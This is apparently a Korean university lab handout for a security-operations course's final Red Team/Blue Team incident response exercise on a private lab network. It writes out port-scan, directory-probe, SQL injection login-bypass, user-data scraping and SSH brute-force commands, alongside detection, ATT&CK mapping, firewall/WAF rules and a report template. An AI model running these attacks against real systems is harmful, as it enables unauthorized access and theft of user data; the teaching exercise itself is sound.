# Week 15: 기말 종합 인시던트 대응 훈련 (상세 버전)

## 학습 목표
- Red Team(공격)과 Blue Team(방어) 역할을 수행한다
- 전체 인시던트 대응 사이클(탐지-분석-격리-제거-복구-교훈)을 완수한다
- 14주간 학습한 관제/분석/대응 기술을 종합 적용한다
- 실전 수준의 인시던트 대응 보고서를 작성한다
- 각 개념의 보안 관점에서의 위험과 대응 방안을 분석할 수 있다
- OpsClaw를 활용하여 실습 작업을 자동화하고 증적을 관리할 수 있다
- 실제 보안 사고 사례와 연결하여 학습 내용을 적용할 수 있다


## 실습 환경 (공통)

| 서버 | IP | 역할 | 접속 |
|------|-----|------|------|
| opsclaw | 10.20.30.201 | Control Plane (OpsClaw) | `ssh opsclaw@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS (nftables, Suricata) | `sshpass -p1 ssh secu@10.20.30.1` |
| web | 10.20.30.80 | 웹서버 (JuiceShop:3000, Apache:80) | `sshpass -p1 ssh web@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh:443, OpenCTI:9400) | `sshpass -p1 ssh siem@10.20.30.100` |
| dgx-spark | 192.168.0.105 | AI/GPU (Ollama:11434) | 원격 API만 |

**OpsClaw API:** `http://localhost:8000` / Key: `opsclaw-api-key-2026`


## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | 이론 강의 (Part 1) | 강의 |
| 0:40-1:10 | 이론 심화 + 사례 분석 (Part 2) | 강의/토론 |
| 1:10-1:20 | 휴식 | - |
| 1:20-2:00 | 실습 (Part 3) | 실습 |
| 2:00-2:40 | 심화 실습 + 도구 활용 (Part 4) | 실습 |
| 2:40-2:50 | 휴식 | - |
| 2:50-3:20 | 응용 실습 + OpsClaw 연동 (Part 5) | 실습 |
| 3:20-3:40 | 복습 퀴즈 + 과제 안내 (Part 6) | 퀴즈 |

---


---

## 용어 해설 (보안관제/SOC 과목)

| 용어 | 영문 | 설명 | 비유 |
|------|------|------|------|
| **SOC** | Security Operations Center | 보안 관제 센터 (24/7 모니터링) | 경찰 112 상황실 |
| **관제** | Monitoring/Surveillance | 보안 이벤트를 실시간 감시하는 활동 | CCTV 관제 |
| **경보** | Alert | 보안 이벤트가 탐지 규칙에 매칭되어 발생한 알림 | 화재 경보기 울림 |
| **이벤트** | Event | 시스템에서 발생한 모든 활동 기록 | 일어난 일 하나하나 |
| **인시던트** | Incident | 보안 정책을 위반한 이벤트 (실제 위협) | 실제 화재 발생 |
| **오탐** | False Positive | 정상 활동을 공격으로 잘못 탐지 | 화재 경보기가 요리 연기에 울림 |
| **미탐** | False Negative | 실제 공격을 놓침 | 도둑이 CCTV에 안 잡힘 |
| **TTD** | Time to Detect | 공격 발생~탐지까지 걸리는 시간 | 화재 발생~경보 울림 시간 |
| **TTR** | Time to Respond | 탐지~대응까지 걸리는 시간 | 경보~소방차 도착 시간 |
| **SIGMA** | SIGMA | SIEM 벤더에 무관한 범용 탐지 룰 포맷 | 국제 표준 수배서 양식 |
| **Tier 1/2/3** | SOC Tiers | 관제 인력 수준 (L1:모니터링, L2:분석, L3:전문가) | 일반의→전문의→교수 |
| **트리아지** | Triage | 경보를 우선순위별로 분류하는 작업 | 응급실 환자 분류 |
| **플레이북** | Playbook (IR) | 인시던트 유형별 대응 절차 매뉴얼 | 화재 대응 매뉴얼 |
| **포렌식** | Forensics | 사이버 범죄 수사를 위한 증거 수집·분석 | 범죄 현장 감식 |
| **IOC** | Indicator of Compromise | 침해 지표 (악성 IP, 도메인, 해시) | 수배범의 지문, 차량번호 |
| **TTP** | Tactics, Techniques, Procedures | 공격자의 전술·기법·절차 | 범인의 범행 수법 |
| **위협 헌팅** | Threat Hunting | 탐지 룰에 걸리지 않는 위협을 능동적으로 찾는 활동 | 잠복 수사 |
| **syslog** | syslog | 시스템 로그를 원격 전송하는 프로토콜 (UDP 514) | 모든 부서 보고서를 본사로 모으는 시스템 |


---

# Week 15: 기말 종합 인시던트 대응 훈련

## 학습 목표
- Red Team(공격)과 Blue Team(방어) 역할을 수행한다
- 전체 인시던트 대응 사이클(탐지-분석-격리-제거-복구-교훈)을 완수한다
- 14주간 학습한 관제/분석/대응 기술을 종합 적용한다
- 실전 수준의 인시던트 대응 보고서를 작성한다

## 전제 조건
- Week 01~14 전체 내용 숙지
- Wazuh, Suricata, nftables 운용 능력

---

## 1. 훈련 개요 (10분)

### 1.1 훈련 구성

```
Phase 1: 환경 점검 + 팀 구성 (15분)
Phase 2: Red Team 공격 (30분)
Phase 3: Blue Team 탐지/분석 (40분)
Phase 4: 격리/제거/복구 (30분)
Phase 5: 보고서 + 발표 (40분)
Phase 6: Lessons Learned (15분)
총 소요 시간: 3시간
```

### 1.2 평가 기준

| 항목 | 배점 | 세부 기준 |
|------|------|----------|
| 탐지 속도 | 20% | 공격 시작부터 탐지까지 시간 |
| 분석 정확도 | 25% | ATT&CK 매핑, 영향 범위 파악 |
| 대응 적절성 | 25% | 격리/제거/복구 절차 |
| 보고서 품질 | 20% | 타임라인, 증거, 권고사항 |
| 팀워크 | 10% | 역할 분담, 커뮤니케이션 |

---

## 2. Phase 1: 환경 점검 (15분)

### 2.1 Blue Team - 방어 환경 확인

```bash
echo "=== Blue Team: 방어 환경 점검 ==="

echo "--- [1] Suricata IPS (secu) ---"
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.1 \
  "systemctl is-active suricata 2>/dev/null && echo 'Suricata: OK' || echo 'Suricata: DOWN'"

echo "--- [2] nftables (secu) ---"
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.1 \
  "echo 1 | sudo -S nft list tables 2>/dev/null | wc -l | xargs -I{} echo 'nftables 테이블: {}'"

echo "--- [3] Wazuh SIEM (siem) ---"
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.100 \
  "systemctl is-active wazuh-manager 2>/dev/null && echo 'Wazuh: OK' || echo 'Wazuh: DOWN'"

echo "--- [4] JuiceShop (web) ---"
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 \
  "curl -s -o /dev/null -w '%{http_code}' http://localhost:3000/ | xargs -I{} echo 'JuiceShop: HTTP {}'"
```

### 2.2 기준선 확보

```bash
echo "=== 기준선 확보 ==="

SURICATA_COUNT=$(sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.1 \
  "wc -l /var/log/suricata/fast.log 2>/dev/null | awk '{print \$1}'" 2>/dev/null)
echo "Suricata 기준선: ${SURICATA_COUNT:-0}줄"

WAZUH_COUNT=$(sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.100 \
  "wc -l /var/ossec/logs/alerts/alerts.json 2>/dev/null | awk '{print \$1}'" 2>/dev/null)
echo "Wazuh 기준선: ${WAZUH_COUNT:-0}줄"

echo "기준선 시간: $(date '+%Y-%m-%d %H:%M:%S')"
```

---

## 3. Phase 2: Red Team 공격 (30분)

### 3.1 Stage 1: 정찰

```bash
echo "=== Red Team: 정찰 ==="

sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 << 'ENDSSH'
echo "--- 포트 스캔 ---"
for port in 22 80 443 3000 8000 8080 3306 5432; do
  (echo > /dev/tcp/10.20.30.1/$port) 2>/dev/null && echo "secu:$port OPEN" &
  (echo > /dev/tcp/10.20.30.100/$port) 2>/dev/null && echo "siem:$port OPEN" &
done
wait 2>/dev/null

echo ""
echo "--- 기술 스택 ---"
curl -sI http://localhost:3000/ | grep -iE "^(server|x-powered)"

echo ""
echo "--- 디렉토리 탐색 ---"
for path in admin api api-docs robots.txt .git package.json ftp; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:3000/$path)
  [ "$CODE" != "404" ] && echo "/$path -> HTTP $CODE"
done
ENDSSH
```

### 3.2 Stage 2: 초기 침투

```bash
echo "=== Red Team: 초기 침투 ==="

sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 << 'ENDSSH'
echo "--- SQL Injection ---"
RESULT=$(curl -s -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'"'"' OR 1=1--","password":"x"}')
echo "$RESULT" | python3 -c "
import json,sys
try:
    d = json.load(sys.stdin)
    if 'authentication' in d:
        print('SQLi 인증 우회 성공')
    else:
        print('SQLi 실패')
except: print('파싱 오류')
" 2>/dev/null

echo ""
echo "--- 사용자 정보 수집 ---"
curl -s http://localhost:3000/api/Users 2>/dev/null | python3 -c "
import json,sys
try:
    d = json.load(sys.stdin)
    users = d.get('data',[])
    print(f'사용자 목록: {len(users)}명')
    for u in users[:3]:
        print(f'  {u.get(\"email\",\"\")} (role: {u.get(\"role\",\"\")})')
except: print('접근 실패')
" 2>/dev/null
ENDSSH
```

### 3.3 Stage 3: SSH 무차별 대입

```bash
echo "=== Red Team: SSH 무차별 대입 시뮬레이션 ==="

sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 << 'ENDSSH'
for i in 1 2 3; do
  sshpass -p"wrong${i}" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
    baduser@10.20.30.1 echo "success" 2>/dev/null || echo "시도 $i: 실패"
done
echo "공격 완료. Blue Team 차례."
ENDSSH
```

---

## 4. Phase 3: Blue Team 탐지/분석 (40분)

### 4.1 경보 수집

```bash
echo "=== Blue Team: 경보 수집 ==="

echo "--- Suricata ---"
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.1 \
  "tail -20 /var/log/suricata/fast.log 2>/dev/null"

echo ""
echo "--- Wazuh ---"
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.100 << 'ENDSSH'
tail -10 /var/ossec/logs/alerts/alerts.json 2>/dev/null | python3 -c "
import sys, json
for line in sys.stdin:
    try:
        a = json.loads(line.strip())
        rule = a.get('rule',{})
        ts = a.get('timestamp','')[:19]
        agent = a.get('agent',{}).get('name','')
        print(f'  [{rule.get(\"level\",0):>2}] {ts} {agent} - {rule.get(\"description\",\"\")}')
    except: pass
" 2>/dev/null
ENDSSH
```

### 4.2 ATT&CK 매핑

```bash
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 << 'ENDSSH'
python3 << 'PYEOF'
attacks = [
    ("Reconnaissance", "T1046", "Network Service Discovery", "포트 스캔"),
    ("Initial Access", "T1190", "Exploit Public-Facing App", "SQL Injection"),
    ("Credential Access", "T1110", "Brute Force", "SSH 무차별 대입"),
    ("Collection", "T1213", "Data from Info Repositories", "/api/Users 접근"),
    ("Discovery", "T1083", "File and Directory Discovery", "디렉토리 탐색"),
]

print(f"{'단계':<20} {'기법':<45} {'증거'}")
print("=" * 80)
for phase, tid, tech, evidence in attacks:
    print(f"{phase:<20} {tid} {tech:<35} {evidence}")
PYEOF
ENDSSH
```

### 4.3 LLM 종합 분석

```bash
curl -s http://192.168.0.105:11434/v1/chat/completions \
  -H "Content-Type: application/json" \
  -d '{
    "model": "gemma3:12b",
    "messages": [
      {"role": "system", "content": "SOC L2 분석관입니다. 인시던트를 종합 분석합니다. 한국어로 간결하게."},
      {"role": "user", "content": "보안 이벤트 분석:\n1. 포트 스캔 (secu/siem 대상)\n2. SQL Injection 인증 우회 성공\n3. /api/Users 사용자 목록 획득\n4. SSH 무차별 대입 3회\n5. .git, api-docs 탐색\n\n1) 위험도 2) 공격자 의도 3) 즉시 대응 권고"}
    ],
    "temperature": 0.3
  }' | python3 -c "import json,sys; print(json.load(sys.stdin)['choices'][0]['message']['content'])"
```

---

## 5. Phase 4: 격리/제거/복구 (30분)

### 5.1 즉시 대응

```bash
echo "=== Blue Team: 즉시 대응 ==="

echo "--- [1] 공격 IP 차단 (시뮬레이션) ---"
echo "  nft add rule inet filter input ip saddr 10.20.30.80 tcp dport 22 drop"

echo "--- [2] WAF 룰 강화 (시뮬레이션) ---"
echo "  SecRule ARGS \"@rx (?i)(union.*select|or.*1.*=.*1)\" \"deny,status:403\""

echo "--- [3] 세션 무효화 ---"
echo "  JuiceShop 관리자 세션 토큰 갱신 필요"
```

### 5.2 취약점 재점검

```bash
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 << 'ENDSSH'
echo "--- SQL Injection 재시도 ---"
RESULT=$(curl -s -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'"'"' OR 1=1--","password":"x"}')
if echo "$RESULT" | grep -q "authentication"; then
  echo "[STILL VULNERABLE] SQLi 동작 - 코드 수정 필요"
else
  echo "[FIXED] SQLi 차단됨"
fi

echo "--- /api/Users 접근 ---"
CODE=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:3000/api/Users)
echo "API Users: HTTP $CODE"
ENDSSH
```

---

## 6. Phase 5: 보고서 (40분)

### 6.1 인시던트 대응 보고서

```bash
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 << 'ENDSSH'
python3 << 'PYEOF'
from datetime import datetime

report = f"""
{'='*70}
          인시던트 대응 보고서
{'='*70}

1. 개요
   분류: 웹 애플리케이션 침해 (SQLi + 정보 유출)
   심각도: High
   영향: JuiceShop 전체 사용자 데이터

2. 타임라인
   +00:00  포트 스캔 탐지 (Suricata)
   +00:05  SQL Injection 탐지
   +00:10  인증 우회 성공 확인
   +00:15  사용자 데이터 접근
   +00:20  SSH 무차별 대입
   +00:25  공격 IP 차단

3. ATT&CK 매핑
   T1046  Network Service Discovery
   T1190  Exploit Public-Facing Application
   T1110  Brute Force
   T1213  Data from Information Repositories

4. 대응 조치
   [완료] 공격 IP 방화벽 차단
   [완료] Suricata 룰 강화
   [필요] SQL Injection 코드 수정
   [필요] API 접근제어 강화

5. 권고사항
   [즉시] Parameterized Query 적용
   [즉시] /api/Users 인증 필수화
   [단기] WAF 룰 고도화
   [장기] 정기 취약점 점검 도입

6. Lessons Learned
   - SQL Injection은 여전히 최대 위협
   - Defense in Depth 전략 필수
   - 인시던트 훈련 정기 실시 필요

{'='*70}
"""
print(report)
PYEOF
ENDSSH
```

---

## 7. Phase 6: Lessons Learned (15분)

### 7.1 과목 총정리

```
Week 01-03: 기초       -> SOC 개론, 시스템/네트워크/웹 로그
Week 04-07: 분석       -> Wazuh, 경보 분석, SIGMA 룰
Week 08:    중간고사   -> 로그 분석 실습 시험
Week 09-10: 대응(1)    -> 인시던트 절차, 웹 공격 대응
Week 11-12: 대응(2,3)  -> 악성코드, 내부 위협
Week 13:    CTI        -> 위협 인텔리전스, IOC, 위협 헌팅
Week 14:    자동화     -> OpsClaw Agent Daemon
Week 15:    기말       -> 종합 인시던트 대응 훈련
```

### 7.2 핵심 역량 자가 진단

| 역량 | 확인 |
|------|------|
| Suricata 경보를 읽고 공격을 분류할 수 있는가? | |
| Wazuh에서 위협을 탐지할 수 있는가? | |
| ATT&CK 프레임워크에 공격을 매핑할 수 있는가? | |
| SIGMA 룰을 작성할 수 있는가? | |
| 인시던트 대응 보고서를 작성할 수 있는가? | |
| IOC 기반 위협 헌팅을 수행할 수 있는가? | |
| OpsClaw로 자동화 관제를 구성할 수 있는가? | |

---

## 핵심 정리

1. 인시던트 대응은 탐지-분석-격리-제거-복구-교훈의 체계적 사이클이다
2. Red/Blue Team 훈련은 실전 대응 능력을 키우는 최선의 방법이다
3. ATT&CK 매핑은 공격 이해와 방어 전략의 공통 언어다
4. 자동화와 인간 분석관의 협업이 최적 보안 관제 모델이다
5. Lessons Learned를 통한 지속적 개선이 보안 성숙도를 높인다


---


---

## 자가 점검 퀴즈 (10문항)

이번 주차의 핵심 내용을 점검한다. 8/10 이상 정답을 목표로 한다.

**Q1.** 이번 주차 "Week 15: 기말 종합 인시던트 대응 훈련"의 핵심 목적은 무엇인가?
- (a) 네트워크 속도 향상  (b) **보안관제 기법/개념의 이해와 실습**  (c) 데이터베이스 관리  (d) UI 디자인

**Q2.** 이 주제에서 로그 분석의 역할은?
- (a) 성능 최적화  (b) 비용 절감  (c) **체계적 분류와 대응 기준 제공**  (d) 사용자 편의

**Q3.** 실습에서 사용한 주요 도구/명령어의 1차 목적은?
- (a) 파일 복사  (b) **인시던트 대응 수행 및 결과 확인**  (c) 메모리 관리  (d) 화면 출력

**Q4.** OpsClaw를 통해 실습을 실행하는 가장 큰 이점은?
- (a) 속도  (b) **모든 실행의 자동 증적(evidence) 기록**  (c) 무료  (d) 간편함

**Q5.** 이 주제의 보안 위험이 높은 이유는?
- (a) 비용이 많이 들어서  (b) 복잡해서  (c) **악용 시 시스템/데이터에 직접적 피해**  (d) 법적 문제

**Q6.** 방어/대응의 핵심 원칙은?
- (a) 모든 트래픽 차단  (b) **최소 권한 + 탐지 + 대응의 조합**  (c) 서버 재시작  (d) 비밀번호 변경

**Q7.** 실습 결과를 분석할 때 가장 먼저 확인해야 하는 것은?
- (a) 서버 이름  (b) **exit_code (성공/실패 여부)**  (c) 파일 크기  (d) 날짜

**Q8.** 이 주제와 관련된 MITRE ATT&CK 전술은?
- (a) Impact만  (b) Reconnaissance만  (c) **주제에 해당하는 전술(들)**  (d) 해당 없음

**Q9.** 실무에서 이 기법/도구를 사용할 때 가장 주의할 점은?
- (a) 속도  (b) **법적 허가와 범위 준수**  (c) 비용  (d) 보고서 양식

**Q10.** 다음 주차와의 연결 포인트는?
- (a) 관련 없음  (b) **이번 주 결과를 다음 주에서 활용/심화**  (c) 완전히 다른 주제  (d) 복습만

**정답:** Q1:b, Q2:c, Q3:b, Q4:b, Q5:c, Q6:b, Q7:b, Q8:c, Q9:b, Q10:b

---

## 과제 (다음 주까지)


## 검증 체크리스트

이번 주차의 학습을 완료하려면 다음 항목을 모두 확인하라:


